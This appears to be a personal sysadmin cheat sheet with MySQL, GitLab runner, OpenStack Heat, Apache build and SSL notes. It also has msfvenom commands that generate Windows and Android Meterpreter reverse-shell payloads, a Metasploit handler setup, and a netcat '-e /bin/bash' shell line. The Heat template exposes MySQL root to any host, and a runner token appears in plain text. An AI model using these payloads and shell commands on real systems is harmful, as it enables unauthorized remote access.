drop user root@127.0.01;
drop user ''@oweb;

grant all privileges on [database name].* to user@'ip' identified by 'pw';

grant all privileges on [database name].tablename to user@'ip' identified by 'pw';


flush privileges;

stop slave;
reset master;


show master status;
show slave status\G;

show databases;
use mysql;
select * from user;


show variables;

mysql -h ip  (mysql´ú¸Õ³s½u¨ì»·ºÝ¥D¾÷)

mysqldump tablename -u root -p > file.sql  (dump)

create databases tablename;
mysql databasename < file.sql   (restore)

drop databases tablename;

------------------------------------------

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=172.20.10.4 -b "\x00" -f exe -o Meterpreter.exe
msfvenom -p android/meterpreter/reverse_tcp LHOST=172.20.10.4 LPORT=4444 -f raw -o /var/www/html/android.apk

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.20.10.4
set ExitOnSession false
exploit -j -z

use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 172.20.10.4
set ExitOnSession false
exploit -j -z

------------------------------------------

[root@gitlab ~]# gitlab-runner register
Running in system-mode.                            
                                                   
Please enter the gitlab-ci coordinator URL (e.g. https://gitlab.com/):
http://gitlab.example.com
Please enter the gitlab-ci token for this runner:
2VXy8mNqJoerWw9yQy15
Please enter the gitlab-ci description for this runner:
[gitlab]: eric-ci-test
Please enter the gitlab-ci tags for this runner (comma separated):
eric-ci-test
Whether to run untagged builds [true/false]:
[false]: true
Whether to lock the Runner to current project [true/false]:
[true]: true
Registering runner... succeeded                     runner=2VXy8mNq
Please enter the executor: docker, docker-ssh, parallels, docker+machine, docker-ssh+machine, shell, ssh, virtualbox, kubernetes:
docker
Please enter the default Docker image (e.g. ruby:2.1):
centos:7
Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded! 


-----------------------------------------------
multi.template

heat_template_version: 2013-05-23

description: >
  HOT template to deploy two servers into an existing neutron tenant network and
  assign floating IP addresses to each server so they are routable from the
  public network.
parameters:
  key_name:
    type: string
    description: Name of keypair to assign to servers
  image:
    type: string
    description: Name of image to use for servers
  flavor:
    type: string
    default: web.tiny
    description: Flavor to use for servers
  public_net_id:
    type: string
    description: >
      ID of public network for which floating IP addresses will be allocated
  private_net_id:
    type: string
    description: ID of private network into which servers get deployed
  private_subnet_id:
    type: string
    description: ID of private sub network into which servers get deployed
  db_root_password:
    type: string
    default: redhat
    description: Root Password for the database

resources:
  web_server:
    type: OS::Nova::Server
    properties:
      name: Web Server
      image: { get_param: image }
      flavor: { get_param: flavor }
      key_name: { get_param: key_name }
      networks:
        - port: { get_resource: web_server_port }
      user_data:
        str_replace:
          template: |
            #!/bin/bash
            echo "Hello world"
            echo "Setting up the Web Server"
            yum install -y php php-mysql wget
            service httpd restart
            wget -P /var/www/html/ http://content.example.com/courses/cl210/rhelosp6.0/materials/check-db.php
            setsebool -P httpd_can_network_connect_db=1
          params:
            $db_rootpassword: { get_param: db_root_password }

  web_server_port:
    type: OS::Neutron::Port
    properties:
      network_id: { get_param: private_net_id }
      fixed_ips:
        - subnet_id: { get_param: private_subnet_id }
      security_groups: [{ get_resource: server_security_group }]

  web_server_floating_ip:
    type: OS::Neutron::FloatingIP
    properties:
      floating_network_id: { get_param: public_net_id }
      port_id: { get_resource: web_server_port }

  db_server:
    type: OS::Nova::Server
    properties:
      name: Database Server
      image: { get_param: image }
      flavor: { get_param: flavor }
      key_name: { get_param: key_name }
      networks:
        - port: { get_resource: db_server_port }
      user_data:
        str_replace:
          template: |
            #!/bin/bash
            echo "Hello world"
            echo "Setting MySQL root password"
            yum install -y mariadb-server
            service mariadb start
            systemctl enable mariadb
            mysqladmin -u root password $db_rootpassword
            mysql -u root -p$db_rootpassword -e "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '$db_rootpassword' WITH GRANT OPTION;"
          params:
            $db_rootpassword: { get_param: db_root_password }

  db_server_port:
    type: OS::Neutron::Port
    properties:
      network_id: { get_param: private_net_id }
      fixed_ips:
        - subnet_id: { get_param: private_subnet_id }
      security_groups: [{ get_resource: server_security_group }]

  db_server_floating_ip:
    type: OS::Neutron::FloatingIP
    properties:
      floating_network_id: { get_param: public_net_id }
      port_id: { get_resource: db_server_port }

  server_security_group:
    type: OS::Neutron::SecurityGroup
    properties:
      description: Add security group rules for server
      name: security-group
      rules:
        - remote_ip_prefix: 0.0.0.0/0
          protocol: tcp
          port_range_min: 22
          port_range_max: 22
        - remote_ip_prefix: 0.0.0.0/0
          protocol: tcp
          port_range_min: 3306
          port_range_max: 3306
        - remote_ip_prefix: 0.0.0.0/0
          protocol: tcp
          port_range_min: 80
          port_range_max: 80
        - remote_ip_prefix: 0.0.0.0/0
          protocol: icmp

outputs:
  Login_URL:
      description: The web server URL
      value:
        str_replace:
          template: http://host/check-db.php
          params:
            host: { get_attr: [ web_server_floating_ip, floating_ip_address ] }
  web_server_private_ip:
    description: IP address of Web Server in private network
    value: { get_attr: [ web_server, first_address ] }
  web_server_public_ip:
    description: Floating IP address of Web Server in public network
    value: { get_attr: [ web_server_floating_ip, floating_ip_address ] }
  db_server_private_ip:
    description: IP address of DB Server in private network
    value: { get_attr: [ db_server, first_address ] }
  db_server_public_ip:
    description: Floating IP address of DB Server in public network
    value: { get_attr: [ db_server_floating_ip, floating_ip_address ] }


----------------------------------------


nc
server
nc -nvv -l -p [port]

clinet
nc [ip] [port] -e /bin/bash


----------------------------------------
Day 0 基礎篇: PXE自動安裝
Day 1 進階篇: PXE自動安裝並動態調整磁區大小


----------------------------------------

apr 1.5.4
./configure --help

./configure	預設安裝/usr/local/
make
make install

apr-util-1.5.4
./configure --with-apr=/usr/local/apr 指定路徑
make
make install


pcre    //perl 為了使用正規表達式用
./configure	預設安裝/usr/local/lib   會看到libpcre*檔案
make
make install


httpd
./configuer --help

Optional Features:
  --disable-option-checking  ignore unrecognized --enable/--with options
  --disable-FEATURE       do not include FEATURE (same as --enable-FEATURE=no)
  --enable-FEATURE[=ARG]  include FEATURE [ARG=yes]
  --enable-layout=LAYOUT
  --enable-dtrace         Enable DTrace probes
  --enable-hook-probes    Enable APR hook probes
  --enable-exception-hook Enable fatal exception hook
  --enable-load-all-modules
                          Load all modules
  --enable-maintainer-mode
                          Turn on debugging and compile time warnings and load
                          all compiled modules
  --enable-debugger-mode  Turn on debugging and compile time warnings and turn
                          off optimization
  --enable-pie            Build httpd as a Position Independent Executable
  --enable-modules=MODULE-LIST
                          Space-separated list of modules to enable | "all" |
                          "most" | "few" | "none" | "reallyall"
  --enable-mods-shared=MODULE-LIST   預設定值(dso 動態模組  可以手動enanble  disable)
                          Space-separated list of shared modules to enable |
                          "all" | "most" | "few" | "reallyall"
  --enable-mods-static=MODULE-LIST    
                          Space-separated list of static modules to enable |
                          "all" | "most" | "few" | "reallyall"
  --disable-authn-file    file-based authentication control
  --enable-authn-dbm      DBM-based authentication control
  --enable-authn-anon     anonymous user authentication control
  --enable-authn-dbd      SQL-based authentication control
  --enable-authn-socache  Cached authentication control
  --disable-authn-core    core authentication module
  
 --with-mpm=MPM
	 --enable-mpms-shared
	 --enable-mods-shared=all		//模組全部載入
	 
	 --with-apr=/usr/local/apr
	 
	 
	 mpm是apache處理連線的機制  
	 mpm有關apache調整效能~
	
./configure --enable-mpms-shared=all --with-apr=/usr/local/apr
make
make install


cd /usr/local/apache2/
cd bin/

ab 壓力測試用的
rotatelogs 每次產生log就會執行logrotae 會拖慢效能  使用os的logrota就好了


./httpd -M  以載入的模組




vim httpd.conf

useradd apache

User 	apache
Group	apache


Include conf/extra/httpd-manual.conf
LoadModule negotiation_module modules/mod_negotiation.so

/usr/local/apache2/bin/httpd -k start


http://10.2.9.105/manual/en/



Listen 80
Listen 80
可以聽不只一個port

modules

Alias



20160705


vhost

2.2
listen 8080

2.4
*:80




"httpd-default.conf"
	keepalive on
	
.htaccess
可以寫apache的設定
會蓋過httpd.conf的設定~

需搭配
httpd.conf
 AllowOverride None

修改完不需要restart apache


ServerTokens Prod   關閉apache header


httpd-info.conf
	ExtendedStatus On
		
<Location /server-status>
    SetHandler server-status
     Require all granted
</Location>



mpm

預派發
<IfModule mpm_prefork_module>
    StartServers             5
    MinSpareServers          5
    MaxSpareServers         10
    MaxRequestWorkers      250
    MaxConnectionsPerChild   0
</IfModule>


<IfModule mpm_worker_module>
    StartServers             3
    MinSpareThreads         75
dule mpm_prefork_module>
    StartServers             5
    MinSpareServers          5
    MaxSpareServers         10
    MaxRequestWorkers      250
    MaxConnectionsPerChild   0
</IfModule>
執行序

<IfModule mpm_event_module>
    StartServers             3
    MinSpareThreads         75
    MaxSpareThreads        250
    ThreadsPerChild         25
    MaxRequestWorkers      400
    MaxConnectionsPerChild   0
</IfModule>
執行序+非同步

mpm是apache用來處理的連線機制



ssl
openssl genrsa -des3 -out server.key 4096
openssl req -new -in server.key -out server.csr
openssl x509 -req -in server.csr -signkey server.key -out server.crt -sha256 -days 3650


yum install httpd_tools



ab -c 100 -n 200 http://10.2.9.105/
